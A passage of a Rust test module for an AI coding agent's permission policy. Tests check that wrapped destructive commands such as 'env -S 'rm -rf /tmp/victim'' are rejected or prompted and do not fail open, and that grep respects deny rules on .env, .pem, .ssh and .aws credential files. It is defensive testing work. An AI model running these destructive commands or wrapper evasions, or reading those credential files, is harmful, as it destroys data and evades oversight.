            bash_rule(RuleAction::Deny, "rm*"),
        ]));
        let must_reject = |cmd: &str| {
            assert!(
                matches!(
                    policy.evaluate_bash_command_policy(cmd),
                    Some(Decision::Reject(_))
                ),
                "must Reject: {cmd}"
            );
        };
        let must_ask = |cmd: &str| {
            assert!(
                matches!(
                    policy.evaluate_bash_command_policy(cmd),
                    Some(Decision::Ask)
                ),
                "must Ask (not fail open): {cmd}"
            );
        };

        // High-confidence Reject (incl. wrappers, later -S after known options).
        for cmd in [
            "env -S 'rm -rf /tmp/victim'",
            "env --split-string 'rm -rf /tmp/victim'",
            "env --split-string='rm -rf /tmp/victim'",
            "env -S'rm -rf /tmp/victim'",
            "/usr/bin/env -S 'rm -rf /tmp/victim'",
            "timeout 5 env -S 'rm -rf /tmp/victim'",
            "env FOO=1 -i -S 'rm -rf /tmp/victim'",
            "command env -S 'rm -rf /tmp/victim'",
            "command timeout 5 command env -S 'rm -rf /tmp/victim'",
            "bash -c \"env -S 'rm -rf /tmp/victim'\"",
            "env -S 'env -S rm'",
            "env FOO=1 rm -rf /tmp/victim",
            "env -P /usr/bin -S 'rm -rf /tmp/victim'",
            "env --path /usr/bin -S 'rm -rf /tmp/victim'",
            "env --path=/usr/bin -S 'rm -rf /tmp/victim'",
            "env -a name -S 'rm -rf /tmp/victim'",
            "env - -S 'rm -rf /tmp/victim'",
            "env -iv -S 'rm -rf /tmp/victim'",
            "env -C /tmp -S 'rm -rf /tmp/victim'",
            "env -uS rm -rf /tmp/victim",
            "env -PSfoo rm -rf /tmp/victim",
        ] {
            must_reject(cmd);
        }

        // Ask rule on outer form still prompts (Reject does not apply).
        let ask_policy = CompiledPolicy::new(PermissionConfig::new(vec![
            bash_rule(RuleAction::Allow, "*"),
            bash_rule(RuleAction::Ask, "env*"),
        ]));
        assert!(matches!(
            ask_policy.evaluate_bash_command_policy("env -S 'rm -rf /tmp/victim'"),
            Some(Decision::Ask)
        ));

        // Clusters / metasyntax / unknown options / missing operand → Ask floor.
        for cmd in [
            "env -iS 'rm -rf /tmp/victim'",
            "env -vS 'rm -rf /tmp/victim'",
            "env -0S 'rm -rf /tmp/victim'",
            "env -xS 'rm -rf /tmp/victim'",
            "env -S",
            "env --split-string",
            "env -S $CMD",
            "env -S 'echo $HOME'",
            "env -S 'rm -rf x #x'",
            r"env -S '\trm -rf /tmp/victim'",
            r"env -S '\nrm -rf /tmp/victim'",
            "env --block-signal SEGV -S 'rm -rf /tmp/victim'",
            "env -x foo -S 'rm -rf /tmp/victim'",
            "env -P",
            "env --prefix /usr/bin -S 'rm -rf /tmp/victim'",
        ] {
            must_ask(cmd);
        }

        // `--` ends options: following `-S` is command text, not split-string.
        assert!(
            !matches!(
                policy.evaluate_bash_command_policy("env -- -S 'rm -rf /tmp/victim'"),
                Some(Decision::Reject(_))
            ),
            "env -- -S must not be treated as split-string"
        );

        let nested_alt = |depth: usize| {
            let mut s = "env -S 'rm -rf /tmp/victim'".to_string();
            for i in 0..depth {
                s = if i % 2 == 0 {
                    format!("command {s}")
                } else {
                    format!("timeout 1 {s}")
                };
            }
            s
        };
        must_reject(&nested_alt(4));
        assert!(
            matches!(
                policy.evaluate_bash_command_policy(&nested_alt(MAX_NORMALIZE_ROUNDS + 2)),
                Some(Decision::Ask) | Some(Decision::Reject(_))
            ),
            "over-budget normalize must not fail open"
        );
        let wrapped = format!(
            "{}env -S 'rm -rf /tmp/victim'",
            "env ".repeat(MAX_WRAPPER_DEPTH + 1)
        );
        assert!(
            matches!(
                policy.evaluate_bash_command_policy(&wrapped),
                Some(Decision::Ask) | Some(Decision::Reject(_))
            ),
            "wrapper-exhausted env -S must not fail open"
        );

        assert!(
            policy
                .evaluate_bash_command_policy("env FOO=1 echo hi")
                .is_none()
        );
    }

    // ── default action tests ──────────────────────────────────────

    #[test]
    fn test_rule_action_defaults_to_deny() {
        assert_eq!(RuleAction::default(), RuleAction::Deny);
    }

    #[test]
    fn test_default_action_rule_denies_access() {
        let policy = PermissionConfig::new(vec![PermissionRule {
            action: RuleAction::default(),
            tool: ToolFilter::Any,
            pattern: None,
            pattern_mode: PatternMode::Glob,
        }]);
        let result = evaluate_policy(&AccessKind::Bash("anything".into()), &policy);
        assert!(
            matches!(result, Some(Decision::Reject(_))),
            "Default RuleAction must deny access, not allow it"
        );
    }

    // ── other tests from main ────────────────────────────────────────────

    #[test]
    fn mcp_tool_respects_deny_policy() {
        let policy = PermissionConfig::new(vec![PermissionRule {
            action: RuleAction::Deny,
            tool: ToolFilter::Mcp,
            pattern: Some("evil_tool".into()),
            pattern_mode: PatternMode::Glob,
        }]);
        let result = evaluate_policy(
            &AccessKind::MCPTool {
                name: "evil_tool".into(),
                input: serde_json::Value::Null,
            },
            &policy,
        );
        assert!(matches!(result, Some(Decision::Reject(_))));
    }

    #[test]
    fn test_evaluate_policy_glob_edit_rule() {
        let policy = PermissionConfig::new(vec![PermissionRule {
            action: RuleAction::Allow,
            tool: ToolFilter::Edit,
            pattern: Some("src/**/*.rs".into()),
            pattern_mode: PatternMode::Glob,
        }]);
        assert!(matches!(
            evaluate_policy(&AccessKind::Edit("src/lib.rs".into()), &policy),
            Some(Decision::Allow)
        ));
    }

    #[test]
    fn deny_web_search_does_not_block_read_bash_or_webfetch() {
        let policy = PermissionConfig::new(vec![PermissionRule {
            action: RuleAction::Deny,
            tool: ToolFilter::WebSearch,
            pattern: None,
            pattern_mode: PatternMode::Glob,
        }]);
        assert!(matches!(
            evaluate_policy(&AccessKind::WebSearch("rust lang".into()), &policy),
            Some(Decision::Reject(_))
        ));
        assert!(evaluate_policy(&AccessKind::Read(Some("src/lib.rs".into())), &policy).is_none());
        assert!(evaluate_policy(&AccessKind::Bash("ls".into()), &policy).is_none());
        assert!(evaluate_policy(&AccessKind::WebFetch("https://x.com".into()), &policy).is_none());
    }

    #[test]
    fn deny_web_fetch_still_blocks_only_webfetch() {
        let policy = PermissionConfig::new(vec![PermissionRule {
            action: RuleAction::Deny,
            tool: ToolFilter::WebFetch,
            pattern: None,
            pattern_mode: PatternMode::Glob,
        }]);
        assert!(matches!(
            evaluate_policy(&AccessKind::WebFetch("https://x.com".into()), &policy),
            Some(Decision::Reject(_))
        ));
        assert!(evaluate_policy(&AccessKind::WebSearch("rust".into()), &policy).is_none());
    }

    /// The Grep tool reads file contents, so managed `Read` rules must govern it:
    /// grepping a denied path is denied, an ask path prompts, and an unrestricted
    /// path is unaffected. A recursive grep (no concrete path) matches no path
    /// rule — tool-level glob excludes (not the policy) keep traversal safe.
    #[test]
    fn grep_tool_covered_by_read_rules() {
        let read_rule = |action: RuleAction, pattern: &str| PermissionRule {
            action,
            tool: ToolFilter::Read,
            pattern: Some(pattern.to_string()),
            pattern_mode: PatternMode::Glob,
        };
        let config = PermissionConfig::new(vec![
            read_rule(RuleAction::Deny, "**/.env"),
            read_rule(RuleAction::Deny, "**/*.pem"),
            read_rule(RuleAction::Deny, "**/.ssh/**"),
            read_rule(RuleAction::Deny, "**/.aws/**"),
            read_rule(RuleAction::Ask, "**/secrets/**"),
        ]);
        let grep = |p: &str| AccessKind::Grep {
            path: Some(p.to_string()),
            glob: None,
        };
        for denied in [".env", "key.pem", ".ssh/id_rsa", ".aws/credentials"] {
            assert!(
                matches!(
                    evaluate_policy(&grep(denied), &config),
                    Some(Decision::Reject(_))
                ),
                "grep on a Read-denied path must deny: {denied}"
            );
        }
        assert!(matches!(
            evaluate_policy(&grep("secrets/value.txt"), &config),
            Some(Decision::Ask)
        ));
        assert!(evaluate_policy(&grep("src/main.rs"), &config).is_none());
        assert!(
            evaluate_policy(
                &AccessKind::Grep {
                    path: None,
                    glob: None,
                },
                &config,
            )
            .is_none()
        );
    }
}
